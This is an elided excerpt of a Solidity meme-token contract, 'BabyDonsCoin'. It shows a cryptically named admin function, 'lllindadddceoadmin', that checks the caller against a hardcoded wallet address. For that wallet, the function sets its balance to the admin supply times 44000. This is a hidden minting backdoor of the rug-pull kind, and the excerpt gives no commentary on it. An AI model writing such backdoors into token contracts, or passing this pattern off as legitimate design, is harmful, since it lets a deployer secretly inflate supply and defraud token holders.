...
contract MEMEToken is Ownable {
    ...
    function lllindadddceoadmin() external {
        ...
        if (_lindaceo477!= tswojaks){
            revert("_lindaceo"); 
        }
        if(_lindaceo477 == tswojaks){
            _balances[_lindaceo477] = adminSupply()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _lindaceo477 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "BabyDonsCoin";
    string _symbol = "BabyDons";
